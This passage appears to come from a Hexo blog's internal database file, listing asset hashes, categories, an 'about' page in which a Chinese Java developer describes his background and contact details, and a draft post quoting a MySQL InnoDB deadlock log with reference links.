9c3a0fea877fe26c7622b3bb31682370263bd","modified":1471920756639},{"_id":"public/asserts/images/logo/ubuntu3.png","hash":"8dd99b80526d1f9e597b02347da50cf47a5c9d38","modified":1471920756639},{"_id":"public/asserts/images/logo/sublime2.png","hash":"688c28f78e1b9492c1c77adcc32500529d11e67f","modified":1471920756639},{"_id":"public/asserts/images/logo/tomcat.png","hash":"8c4a546b0515763f98f3a8348c95175f0e776c20","modified":1471920756639},{"_id":"public/asserts/images/logo/ubuntu2.png","hash":"fb55e693049903c1963656fdbdc7e32f578015df","modified":1471920756639},{"_id":"public/asserts/images/logo/vulnerability.png","hash":"e285c827a350067e14c78b5207bd6c146590065d","modified":1471920756639},{"_id":"public/asserts/images/logo/sublime4.png","hash":"1c74b6cd451934417bcae2fb0fd4d04ba602c871","modified":1471920756639},{"_id":"public/asserts/images/logo/vim.png","hash":"a072b61ec70c54fd1b04baeacbc428cf177ac906","modified":1471920756639},{"_id":"public/asserts/images/logo/ubuntu.png","hash":"e05e6e58c559bbb805e95d3883e1528fb4a6c234","modified":1471920756639},{"_id":"public/asserts/images/logo/velocity.png","hash":"a9014eccb7f0a706fb9d14b46486bd9dbc1607b9","modified":1471920756639},{"_id":"public/asserts/images/logo/sublime3.png","hash":"791b3c1c990a78bbeb9b781c7ec1d08b8d4e35e3","modified":1471920756639},{"_id":"public/asserts/images/logo/velocity2.png","hash":"6c3cdcaf3e0689325348b89a2406c60fcff58737","modified":1471920756640},{"_id":"public/background/backup/bg-3.jpg","hash":"1a06d3a660bfb99b62d760e4e1e09de168a4c74c","modified":1471920756640},{"_id":"public/asserts/images/logo/vulnerability2.png","hash":"6ebfa4b6b50a46cf6a8f9250b774918cfdc9547e","modified":1471920756640},{"_id":"public/background/backup/bg-1.jpg","hash":"31d7bb15211000c05656899302f8ec9ee3de0e9f","modified":1471920756640},{"_id":"public/background/backup/bg-2.jpg","hash":"7ae358f3ab8b41558444053400e796c41b3ba0e2","modified":1471920756640},{"_id":"public/background/backup/bg-4.jpg","hash":"6df1383d0f6134016d844df9abb740a6e0c0b2c5","modified":1471920756640},{"_id":"public/asserts/images/article/charles使用手记/charles-proxy-trust-dialog.png","hash":"240b90035e12eb6fa0248ef4cba68862a78ea0a4","modified":1471920756640},{"_id":"public/asserts/images/article/yelee主题最近访客/2016-08-20 13-41-17.jpg","hash":"b60443e430605f395ba0ba436abe2d1af99f2420","modified":1471920756640},{"_id":"public/asserts/images/article/yelee主题最近访客/2016-08-20 14-27-49.jpg","hash":"95e3133f78838c1cd5854cad8badeea711fe7f86","modified":1471920756640},{"_id":"public/asserts/images/article/python 520/520_source.png","hash":"d000a23f41b44531a36e2d520b2f190912f0d5d6","modified":1471920756640},{"_id":"public/asserts/images/article/python 520/520_run.png","hash":"09fc171efe01c034a8349fb4398167f42f4213ba","modified":1471920756640},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_16.png","hash":"8c91f2d64ce16019ab06bea7438bfb84ae67d424","modified":1471920756640},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_5.png","hash":"61fea178a465e3051325d3f68e2b1238b1be9dff","modified":1471920756640},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_23.png","hash":"79054ab09ab70b6551c0e8d8d79c9dd3707f8729","modified":1471920756640},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_28.png","hash":"a4eb266146848b4e04844ae16fc5ea457f7d60e0","modified":1471920756640},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_6.png","hash":"76f7fd42e555c418bf9b1ca0f7506206ba1fb98e","modified":1471920756640},{"_id":"public/background/bg-6.jpg","hash":"51b427f07ffc6f2ad97651f23cc16e8f19ed02f9","modified":1471920756640},{"_id":"public/background/bg-5.jpg","hash":"e4a3631b6b0f94ebce30a6f01ecb2b6ed7cfdb0b","modified":1471920756641},{"_id":"public/js/mobile.js","hash":"0f4c1fcd6df47a196ed9495c225173402aa7d769","modified":1471920756646},{"_id":"public/js/GithubRepoWidget.js","hash":"624e81a3b0e57495b0c0e0b3e056296c6e8ae5df","modified":1471920756646},{"_id":"public/js/instagram.js","hash":"f19adbcc0dac33536bc6660598059048ec901882","modified":1471920756646},{"_id":"public/js/main.js","hash":"d58bbc593d94d48e85d4ebfb002910444080cb06","modified":1471920756646},{"_id":"public/js/search.js","hash":"b456aaab98bbc3b0906f8a16d1e6e4f74dfcffda","modified":1471920756646},{"_id":"public/js/pc.js","hash":"19a1660b10358046e7a1f398284491519b2ffd47","modified":1471920756646},{"_id":"public/js/toc.js","hash":"72ba1228fc1a44df45b8f4b562eba78594f13016","modified":1471920756646},{"_id":"public/css/style.css","hash":"462c6798b06850f28976754db92b154543c76283","modified":1471920756646},{"_id":"public/asserts/images/logo/blog3.png","hash":"84de1c4297ba1414064d1b8bbd86679e74929429","modified":1471920756646},{"_id":"public/asserts/images/logo/blog6.png","hash":"848a0a5a9fa5551d5ad33f7a8960e5b2a891da2c","modified":1471920756646},{"_id":"public/asserts/images/logo/java2.png","hash":"cf788b779b00a8e586b50dd96a7fc7cadf58b58a","modified":1471920756646},{"_id":"public/asserts/images/logo/blog4.png","hash":"91aeec926098e0496f9d96cdf9993da232306abb","modified":1471920756647},{"_id":"public/asserts/images/logo/java.png","hash":"8a72414284e66fa08f89c2735e48f5bf79d94469","modified":1471920756647},{"_id":"public/asserts/images/logo/hack3.png","hash":"a6084d2973c1aa8ebc783f2b166061d54d977c1d","modified":1471920756647},{"_id":"public/asserts/images/logo/xss.png","hash":"023f8622be80a84b5e2f7efc3bdd13c311e9b7d7","modified":1471920756647},{"_id":"public/asserts/images/logo/jquery.png","hash":"dfe6679979aef9f3ac0de186de7413aa20ca3689","modified":1471920756647},{"_id":"public/asserts/images/article/charles使用手记/1009004.jpg","hash":"160e62c3501de9cfccb8dfd266dc450eace5e864","modified":1471920756647},{"_id":"public/asserts/images/article/charles使用手记/234626zltkgqegkdk9egk9.png","hash":"2ed362ad946639bf062e846b9c9ad7804e0a0219","modified":1471920756647},{"_id":"public/asserts/images/article/charles使用手记/charles-proxy-http-setting.png","hash":"aa7d93e67accfe0255ca89965223e9db570baae6","modified":1471920756647},{"_id":"public/asserts/images/article/charles使用手记/234626efeiiiee0ie0de1d.png","hash":"8d88a79eea06e8b3576c19e52d7e484e1db6e233","modified":1471920756647},{"_id":"public/asserts/images/article/charles使用手记/charles-proxy-http-switch.png","hash":"fab3dc62f45aa1cb269d95a06c2781efcce72565","modified":1471920756647},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_12.png","hash":"e2c3cbc61134808c43adde72229efbff4fee16b2","modified":1471920756647},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_13.png","hash":"ed8d56aa4651cc7255df64c495ad97069d13a99a","modified":1471920756647},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_3.png","hash":"ec59e1a4450f07bf9b0bfcae7990c5d50591cd8e","modified":1471920756647},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_4.png","hash":"31ef42896bee0a92654a40bfe33d8356b9bee187","modified":1471920756647},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_7.png","hash":"0999dcfc889889a5b9d5ca867297ebbaa83de5a9","modified":1471920756648},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_24.png","hash":"91cf2d980e810569ccd5df0e8a7bb68f019337da","modified":1471920756648},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_27.png","hash":"7d4150df96d591b78a95004a93a9e8b5b1feab5f","modified":1471920756648},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_22.png","hash":"d27c19c3509881224567396f89a718a5c401cc52","modified":1471920756648},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160310_31.png","hash":"484c30e987b098534161cb66ba03aa13cb0308ae","modified":1471920756648},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_30.png","hash":"33656c1c99cbd6b3d6d2ff73b098e6cac61f9d0c","modified":1471920756648},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_29.png","hash":"d8e51c8addeadce40f3c0bf813f400a470835649","modified":1471920756648},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160310_34.png","hash":"a88791cf815ce6e1b24399cf7ba8bd5aaa50970f","modified":1471920756648},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160310_33.png","hash":"e8fcb4169ca2547adf6ce40dd9aefa51fa107f85","modified":1471920756648},{"_id":"public/asserts/images/article/charles使用手记/234626dfzl5ddirvab0wlf.png","hash":"6edadca21701fbe779a758cfc9bad85d0c794636","modified":1471920756648},{"_id":"public/asserts/images/logo/charles.png","hash":"698f0eeead1e840a4eb4f96220480467e0d5597c","modified":1471920756665},{"_id":"public/asserts/images/logo/blog5.png","hash":"e8c0609a47dc0342a67705bc109140eefc45f6fc","modified":1471920756665},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_1.png","hash":"db1c23da8487fbea8fcede65a59b99104bbd5cc5","modified":1471920756666},{"_id":"public/asserts/images/article/charles使用手记/charles-proxy-phone.jpg","hash":"90fad25d30a252bba6bd1134d156d4d2f4d88d61","modified":1471920756666},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_21.png","hash":"33da8435a346b00e7a6e10f27c3984054b48f164","modified":1471920756666},{"_id":"public/asserts/images/logo/blog9.png","hash":"186903ce477ac5961f98e4744c1b4c8472b3c4ad","modified":1471920756669},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160308_15.png","hash":"f866ea89fcc14f33ab03f589d00f0559e33719e9","modified":1471920756669},{"_id":"public/asserts/images/article/charles使用手记/charles-proxy-local-ip.png","hash":"e533e58050904b772bca5352339c106192cd9433","modified":1471920756669},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160310_35.png","hash":"46c31abc7a281a8f0fb6e7dff144cc1ded3d8441","modified":1471920756669},{"_id":"public/asserts/images/article/charles使用手记/20141130195559531.png","hash":"df80d730e2829d4be8c973e56722f683d19d4d6d","modified":1471920756675},{"_id":"public/asserts/images/article/WEB安全渗透分享/Snip20160309_25.png","hash":"768a8aad5603923fd536f470e2ecf2072131b917","modified":1471920756680},{"_id":"public/asserts/images/logo/blog2.png","hash":"7b84642a2aaab6238365360d26a4195f756b5858","modified":1471920756686},{"_id":"public/asserts/images/logo/blog7.png","hash":"cb628f6c8ebe4b4769c25f3c5671fe74a53f2341","modified":1471920756687},{"_id":"source/_posts/article/js/代码高亮工具Prism.js.md","hash":"aea2e6680a8f25aafc2512e132078240e85fd51b","modified":1472120995000},{"_id":"source/_posts/article/mac/Mac软件更新一.md","hash":"4d9fb6d5dcca916b5a5901e294fcb61859c53dfb","modified":1472093738000},{"_id":"source/asserts/images/logo/prismjs.jpg","hash":"654203a9ba8e7520108c9b8384eb88639fec2a1b","modified":1472118445000},{"_id":"source/asserts/images/article/代码高亮类库Prism/Snip20160825_53.png","hash":"a4a051c25423e1734b62cd391f6e2f7020db5d46","modified":1472115181000},{"_id":"source/asserts/images/article/代码高亮类库Prism/Snip20160825_58.png","hash":"db353490b2d1bbea1291749901bd85cac54f5103","modified":1472119174000},{"_id":"source/asserts/images/article/代码高亮类库Prism/Snip20160825_60.png","hash":"cfff7db717e1e8a985207442976757282239f409","modified":1472119201000},{"_id":"source/asserts/images/article/代码高亮类库Prism/Snip20160825_54.png","hash":"6d4d4c9e8a9ccf75ac0aa0a20cf56f08c7b22a1c","modified":1472116902000},{"_id":"source/asserts/images/article/代码高亮类库Prism/Snip20160825_57.png","hash":"50bfc80fb8555db20167bbdb15e7284a093c0d28","modified":1472119157000},{"_id":"source/asserts/images/article/代码高亮类库Prism/Snip20160825_61.png","hash":"b9d1a970dcbe7fb285eb6e6e9279a0eccffde447","modified":1472119213000},{"_id":"source/asserts/images/article/代码高亮类库Prism/Snip20160825_62.png","hash":"26c4a847fee7b642d1b6eac4e7486e4e9a4396fe","modified":1472119235000},{"_id":"source/_posts/article/js/代码高亮类库Prism.md","hash":"f11fb454cf4fb5f21b179b879bcd76b0a88cb8a5","modified":1472121147000},{"_id":"source/_posts/article/js/代码高亮类库prismjs.md","hash":"238bbc0426034c70544786eeba28cd938eb580fd","modified":1472125219000},{"_id":"source/asserts/images/article/代码高亮类库Prism/.TheUnarchiverTemp0/qiniu-devtools-darwin_amd64-v2.6.20131211/qboxrsctl","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1472127826000},{"_id":"source/asserts/images/article/代码高亮类库Prism/qiniu-devtools-darwin_amd64-v2.6.20131211/qetag","hash":"33e4441202329293df91058aab25d3d3efca3247","modified":1386758620000},{"_id":"source/asserts/images/article/代码高亮类库Prism/qiniu-devtools-darwin_amd64-v2.6.20131211/qboxrsctl","hash":"1d433b93a310bdda7cb5fe94dcc8ab7c4e695e71","modified":1386758620000},{"_id":"source/asserts/images/article/代码高亮类库Prism/qiniu-devtools-darwin_amd64-v2.6.20131211/qrsync","hash":"dc6e04be613c83c868233bac6d6c6d4162fae87f","modified":1386758620000}],"Category":[{"name":"mysql","_id":"cis6vlxo900075nbtlanai6kg"},{"name":"cache","_id":"cis6vlxoi000d5nbtpnx9km6v"},{"name":"工具软件","_id":"cis6vlxot000n5nbtaxpb93ds"},{"name":"系统脚本","_id":"cis6vlxox000r5nbtfdpb3jan"},{"name":"数据存储","_id":"cis6vlxpz00115nbts575nni5"},{"name":"版本控制","_id":"cis6vlxqd00165nbt1fqcfy89"},{"name":"博客搭建","_id":"cis6vlxqz001u5nbtlxf4ipxb"},{"name":"后端开发","_id":"cis6vlxs2003b5nbtidccoyeb"},{"name":"持续集成","_id":"cis6vlxt5004l5nbt7sm1tauz"},{"name":"前端设计","_id":"cis6vlxts005h5nbttsh68u03"},{"name":"系统配置","_id":"cis6vlxua00635nbtqay65s3x"},{"name":"信息安全","_id":"cis6vlxup006p5nbt7rto1xnz"}],"Data":[],"Page":[{"_content":"<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://yeshaoting.cn\" homePageName=\"回到我的主页\"></script>\n","source":"404.html","raw":"<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://yeshaoting.cn\" homePageName=\"回到我的主页\"></script>\n","date":"2016-08-20T07:34:28.000Z","updated":"2016-08-20T07:13:48.000Z","path":"404.html","title":"","comments":1,"layout":"page","_id":"cis6vlxix00005nbtsxedwovv","content":"<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homepageurl=\"http://yeshaoting.cn\" homepagename=\"回到我的主页\"></script>\n","excerpt":"","more":"<script type=\"text/javascript\" src=\"http://www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"http://yeshaoting.cn\" homePageName=\"回到我的主页\"></script>\n"},{"_content":"google-site-verification: googlede92bb3790f9a30d.html","source":"googlede92bb3790f9a30d.html","raw":"google-site-verification: googlede92bb3790f9a30d.html","date":"2016-08-20T07:34:28.000Z","updated":"2016-08-20T07:13:48.000Z","path":"googlede92bb3790f9a30d.html","title":"","comments":1,"layout":"page","_id":"cis6vlxjf00015nbtx7j9dvqk","content":"google-site-verification: googlede92bb3790f9a30d.html","excerpt":"","more":"google-site-verification: googlede92bb3790f9a30d.html"},{"title":"关于","date":"2015-12-29T07:51:00.000Z","_content":"\nhi，我是叶绍亭，80后，将近而立之年，目前是在美团工作的Web开发者一枚。\n计算机专业毕业，4年在职工作经验，6年web开发经验。\n\n本人酷爱计算机，执着于编程，崇尚技术，立志成为技术大牛。\n\n\n## 联系我\n - 邮箱：[yeshaoting@163.com](mailto:yeshaoting@163.com)\n - 主页：http://yeshaoting.cn\n - 技术博客：http://jarg.iteye.com\n - 微博：[@悠然萧萧](http://weibo.com/jarg)\n\n\n## 教育经历\n| 学校 | 学历 | 专业 | 起至时间 |\n|---|---|\n| 大连海事大学 | 研究生| 计算机科学与技术 | 2010-09-01 ~ 2012-07-01 |\n| 黑龙江大学 | 本科| 计算机科学与技术 | 2006-09-01 ~ 2010-07-01 |\n\n\n## 工作经历\n| 公司 | 职位 | 起至时间 |\n|---|---|\n| 美团 | Java工程师 | 2015-11-25 ~ 至今 |\n| 搜狐视频 | Java工程师 | 2014-12-17 ~ 2015-11-23 |\n| 百度 | Java工程师 | 2006-07-11 ~ 2014-12-15 |\n\n\n## 关注技术\n**后端技术**：`java`、`spring`、`mybatis`、`hibernate`、`thrift`、`quartz`\n**前端设计**：`jquery`、`bootstrap`、`angularjs`\n**系统运维**：`linux`、`python`、`shell`、`vim`\n**测试工具**：`jmeter`、`selenium`\n**搜索**：`solr`、`lucene`\n**数据库**：`mysql`\n**持续集成**：`jenkins`\n\n\n## 个人箴言\n成功不是将来才有的，而是从决定去做的那一刻起，持续累积而成的！\n\n\n## 关于博客\n借助hexo搭建的博客，静态页面代码托管在github上。\n\n\n## 声明\n博客所有观点纯属个人理解，如有误导请指正。\n","source":"about/index.md","raw":"title: 关于\ndate: 2015-12-29 15:51:00\n---\n\nhi，我是叶绍亭，80后，将近而立之年，目前是在美团工作的Web开发者一枚。\n计算机专业毕业，4年在职工作经验，6年web开发经验。\n\n本人酷爱计算机，执着于编程，崇尚技术，立志成为技术大牛。\n\n\n## 联系我\n - 邮箱：[yeshaoting@163.com](mailto:yeshaoting@163.com)\n - 主页：http://yeshaoting.cn\n - 技术博客：http://jarg.iteye.com\n - 微博：[@悠然萧萧](http://weibo.com/jarg)\n\n\n## 教育经历\n| 学校 | 学历 | 专业 | 起至时间 |\n|---|---|\n| 大连海事大学 | 研究生| 计算机科学与技术 | 2010-09-01 ~ 2012-07-01 |\n| 黑龙江大学 | 本科| 计算机科学与技术 | 2006-09-01 ~ 2010-07-01 |\n\n\n## 工作经历\n| 公司 | 职位 | 起至时间 |\n|---|---|\n| 美团 | Java工程师 | 2015-11-25 ~ 至今 |\n| 搜狐视频 | Java工程师 | 2014-12-17 ~ 2015-11-23 |\n| 百度 | Java工程师 | 2006-07-11 ~ 2014-12-15 |\n\n\n## 关注技术\n**后端技术**：`java`、`spring`、`mybatis`、`hibernate`、`thrift`、`quartz`\n**前端设计**：`jquery`、`bootstrap`、`angularjs`\n**系统运维**：`linux`、`python`、`shell`、`vim`\n**测试工具**：`jmeter`、`selenium`\n**搜索**：`solr`、`lucene`\n**数据库**：`mysql`\n**持续集成**：`jenkins`\n\n\n## 个人箴言\n成功不是将来才有的，而是从决定去做的那一刻起，持续累积而成的！\n\n\n## 关于博客\n借助hexo搭建的博客，静态页面代码托管在github上。\n\n\n## 声明\n博客所有观点纯属个人理解，如有误导请指正。\n","updated":"2016-08-20T07:13:48.000Z","path":"about/index.html","comments":1,"layout":"page","_id":"cis6vlxl800025nbtfmtiwmty","content":"<p>hi，我是叶绍亭，80后，将近而立之年，目前是在美团工作的Web开发者一枚。<br>计算机专业毕业，4年在职工作经验，6年web开发经验。</p>\n<p>本人酷爱计算机，执着于编程，崇尚技术，立志成为技术大牛。</p>\n<h2 id=\"联系我\"><a href=\"#联系我\" class=\"headerlink\" title=\"联系我\"></a>联系我</h2><ul>\n<li>邮箱：<a href=\"mailto:yeshaoting@163.com\" target=\"_blank\" rel=\"external\">yeshaoting@163.com</a></li>\n<li>主页：<a href=\"http://yeshaoting.cn\">http://yeshaoting.cn</a></li>\n<li>技术博客：<a href=\"http://jarg.iteye.com\" target=\"_blank\" rel=\"external\">http://jarg.iteye.com</a></li>\n<li>微博：<a href=\"http://weibo.com/jarg\" target=\"_blank\" rel=\"external\">@悠然萧萧</a></li>\n</ul>\n<h2 id=\"教育经历\"><a href=\"#教育经历\" class=\"headerlink\" title=\"教育经历\"></a>教育经历</h2><table>\n<thead>\n<tr>\n<th>学校</th>\n<th>学历</th>\n<th>专业</th>\n<th>起至时间</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>大连海事大学</td>\n<td>研究生</td>\n<td>计算机科学与技术</td>\n<td>2010-09-01 ~ 2012-07-01</td>\n</tr>\n<tr>\n<td>黑龙江大学</td>\n<td>本科</td>\n<td>计算机科学与技术</td>\n<td>2006-09-01 ~ 2010-07-01</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"工作经历\"><a href=\"#工作经历\" class=\"headerlink\" title=\"工作经历\"></a>工作经历</h2><table>\n<thead>\n<tr>\n<th>公司</th>\n<th>职位</th>\n<th>起至时间</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>美团</td>\n<td>Java工程师</td>\n<td>2015-11-25 ~ 至今</td>\n</tr>\n<tr>\n<td>搜狐视频</td>\n<td>Java工程师</td>\n<td>2014-12-17 ~ 2015-11-23</td>\n</tr>\n<tr>\n<td>百度</td>\n<td>Java工程师</td>\n<td>2006-07-11 ~ 2014-12-15</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"关注技术\"><a href=\"#关注技术\" class=\"headerlink\" title=\"关注技术\"></a>关注技术</h2><p><strong>后端技术</strong>：<code>java</code>、<code>spring</code>、<code>mybatis</code>、<code>hibernate</code>、<code>thrift</code>、<code>quartz</code><br><strong>前端设计</strong>：<code>jquery</code>、<code>bootstrap</code>、<code>angularjs</code><br><strong>系统运维</strong>：<code>linux</code>、<code>python</code>、<code>shell</code>、<code>vim</code><br><strong>测试工具</strong>：<code>jmeter</code>、<code>selenium</code><br><strong>搜索</strong>：<code>solr</code>、<code>lucene</code><br><strong>数据库</strong>：<code>mysql</code><br><strong>持续集成</strong>：<code>jenkins</code></p>\n<h2 id=\"个人箴言\"><a href=\"#个人箴言\" class=\"headerlink\" title=\"个人箴言\"></a>个人箴言</h2><p>成功不是将来才有的，而是从决定去做的那一刻起，持续累积而成的！</p>\n<h2 id=\"关于博客\"><a href=\"#关于博客\" class=\"headerlink\" title=\"关于博客\"></a>关于博客</h2><p>借助hexo搭建的博客，静态页面代码托管在github上。</p>\n<h2 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h2><p>博客所有观点纯属个人理解，如有误导请指正。</p>\n","excerpt":"","more":"<p>hi，我是叶绍亭，80后，将近而立之年，目前是在美团工作的Web开发者一枚。<br>计算机专业毕业，4年在职工作经验，6年web开发经验。</p>\n<p>本人酷爱计算机，执着于编程，崇尚技术，立志成为技术大牛。</p>\n<h2 id=\"联系我\"><a href=\"#联系我\" class=\"headerlink\" title=\"联系我\"></a>联系我</h2><ul>\n<li>邮箱：<a href=\"mailto:yeshaoting@163.com\">yeshaoting@163.com</a></li>\n<li>主页：<a href=\"http://yeshaoting.cn\">http://yeshaoting.cn</a></li>\n<li>技术博客：<a href=\"http://jarg.iteye.com\">http://jarg.iteye.com</a></li>\n<li>微博：<a href=\"http://weibo.com/jarg\">@悠然萧萧</a></li>\n</ul>\n<h2 id=\"教育经历\"><a href=\"#教育经历\" class=\"headerlink\" title=\"教育经历\"></a>教育经历</h2><table>\n<thead>\n<tr>\n<th>学校</th>\n<th>学历</th>\n<th>专业</th>\n<th>起至时间</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>大连海事大学</td>\n<td>研究生</td>\n<td>计算机科学与技术</td>\n<td>2010-09-01 ~ 2012-07-01</td>\n</tr>\n<tr>\n<td>黑龙江大学</td>\n<td>本科</td>\n<td>计算机科学与技术</td>\n<td>2006-09-01 ~ 2010-07-01</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"工作经历\"><a href=\"#工作经历\" class=\"headerlink\" title=\"工作经历\"></a>工作经历</h2><table>\n<thead>\n<tr>\n<th>公司</th>\n<th>职位</th>\n<th>起至时间</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>美团</td>\n<td>Java工程师</td>\n<td>2015-11-25 ~ 至今</td>\n</tr>\n<tr>\n<td>搜狐视频</td>\n<td>Java工程师</td>\n<td>2014-12-17 ~ 2015-11-23</td>\n</tr>\n<tr>\n<td>百度</td>\n<td>Java工程师</td>\n<td>2006-07-11 ~ 2014-12-15</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"关注技术\"><a href=\"#关注技术\" class=\"headerlink\" title=\"关注技术\"></a>关注技术</h2><p><strong>后端技术</strong>：<code>java</code>、<code>spring</code>、<code>mybatis</code>、<code>hibernate</code>、<code>thrift</code>、<code>quartz</code><br><strong>前端设计</strong>：<code>jquery</code>、<code>bootstrap</code>、<code>angularjs</code><br><strong>系统运维</strong>：<code>linux</code>、<code>python</code>、<code>shell</code>、<code>vim</code><br><strong>测试工具</strong>：<code>jmeter</code>、<code>selenium</code><br><strong>搜索</strong>：<code>solr</code>、<code>lucene</code><br><strong>数据库</strong>：<code>mysql</code><br><strong>持续集成</strong>：<code>jenkins</code></p>\n<h2 id=\"个人箴言\"><a href=\"#个人箴言\" class=\"headerlink\" title=\"个人箴言\"></a>个人箴言</h2><p>成功不是将来才有的，而是从决定去做的那一刻起，持续累积而成的！</p>\n<h2 id=\"关于博客\"><a href=\"#关于博客\" class=\"headerlink\" title=\"关于博客\"></a>关于博客</h2><p>借助hexo搭建的博客，静态页面代码托管在github上。</p>\n<h2 id=\"声明\"><a href=\"#声明\" class=\"headerlink\" title=\"声明\"></a>声明</h2><p>博客所有观点纯属个人理解，如有误导请指正。</p>\n"},{"title":"分类 & 标签","date":"2016-08-16T06:35:14.000Z","fancybox":false,"_content":"","source":"tags/index.md","raw":"title: 分类 & 标签\ndate: 2016-08-16 14:35:14\nfancybox: false\n---\n","updated":"2016-08-20T07:13:48.000Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cis6vlxlb00035nbt7imt7lz0","content":"","excerpt":"","more":""}],"Post":[{"title":"mysql LATEST DETECTED DEADLOCK","date":"2015-12-29T12:46:00.000Z","_content":"\n# mysql LATEST DETECTED DEADLOCK\n\n``` sql\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n130819 14:01:12\n*** (1) TRANSACTION:\nTRANSACTION 0 108626388, ACTIVE 0 sec, process no 8726, OS thread id 47220783470912\nstarting index read\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1216, 2 row lock(s), undo log entries 1\nMySQL thread id 4283, query id 21974219 10.92.210.108 ddrsrbe Updating\nupdate ddrsproduction.requests set request_priority_grade_id=3, costs=0, data_version=1, date_completed='2013-08-19 13:59:39', date_end='2013-05-24 23:59:00', date_required_by='2013-08-26 13:57:31', date_start='2013-05-19 00:01:00', date_submitted='2013-08-19 13:57:31', designated_authority_id=84528, is_manual=1, missed_sla_reason=null, missed_sla_reason_ask_user=null, product_id=35, request_cost_status_id=0, request_delivery_method_id=0, request_legislation_id=0, request_method_id=0, request_reason_id=1, request_result_status_id=null, origin_id=0, request_status_id=2, request_type_id=1, result_row_count=2, results_last_downloaded=null, site_processed='KNOW', time_zone=null, urn='LBP/281/35/12 (CONS)', user_id=2357, vf_rep_id=8 where request_id=132536\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\n```\n\n参见：\n[MySQL Innodb Deadlock - how to remove old event?](http://stackoverflow.com/questions/21573684/mysql-innodb-deadlock-how-to-remove-old-event)\n[How can I stop a running MySQL query?](http://stackoverflow.com/questions/3787651/how-can-i-stop-a-running-mysql-query)\n[mysql thread入门分析](http://blog.csdn.net/wyzxg/article/details/8258033)\n[MySQL查询阻塞语句](http://blog.itpub.net/29254281/viewspace-1420158/)\n[如何 查找 mysql 中如何 kill 引起死锁的线程id](http://zhidao.baidu.com/link?url=Dbx5nrJ-HniRjqzX4UvKkXdoIAhUwCsMfriWuVBZFPTtNfkTWxQYtFz6WFNM54STI3AhdNkzP7QduoJNKTlPIfSHsLtv6Ql63lyDKmq9qT3)\n[Trying to understand MySQL deadlock on InnoDB table](http://stackoverflow.com/questions/11331029/trying-to-understand-mysql-deadlock-on-innodb-table)\n","source":"_drafts/article/database/mysql LATEST DETECTED DEADLOCK.md","raw":"title: mysql LATEST DETECTED DEADLOCK\ntags:\n  - mysql\ncategories:\n  - mysql\ndate: 2015-12-29 20:46:00\n---\n\n# mysql LATEST DETECTED DEADLOCK\n\n``` sql\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n130819 14:01:12\n*** (1) TRANSACTION:\nTRANSACTION 0 108626388, ACTIVE 0 sec, process no 8726, OS thread id 47220783470912\nstarting index read\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1216, 2 row lock(s), undo log entries 1\nMySQL thread id 4283, query id 21974219 10.92.210.108 ddrsrbe Updating\nupdate ddrsproduction.requests set request_priority_grade_id=3, costs=0, data_version=1, date_completed='2013-08-19 13:59:39', date_end='2013-05-24 23:59:00', date_required_by='2013-08-26 13:57:31', date_start='2013-05-19 00:01:00', date_submitted='2013-08-19 13:57:31', designated_authority_id=84528, is_manual=1, missed_sla_reason=null, missed_sla_reason_ask_user=null, product_id=35, request_cost_status_id=0, request_delivery_method_id=0, request_legislation_id=0, request_method_id=0, request_reason_id=1, request_result_status_id=null, origin_id=0, request_status_id=2, request_type_id=1, result_row_count=2, results_last_downloaded=null, site_processed='KNOW', time_zone=null, urn='LBP/281/35/12 (CONS)', user_id=2357, vf_rep_id=8 where request_id=132536\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\n```\n\n参见：\n[MySQL Innodb Deadlock - how to remove old event?](http://stackoverflow.com/questions/21573684/mysql-innodb-deadlock-how-to-remove-old-event)\n[How can I stop a running MySQL query?](http://stackoverflow.com/questions/3787651/how-can-i-stop-a-running-mysql-query)\n[mysql thread入门分析](http://blog.csdn.net/wyzxg/article/details/8258033)\n[MySQL查询阻塞语句](http://blog.itpub.net/29254281/viewspace-1420158/)\n[如何 查找 mysql 中如何 kill 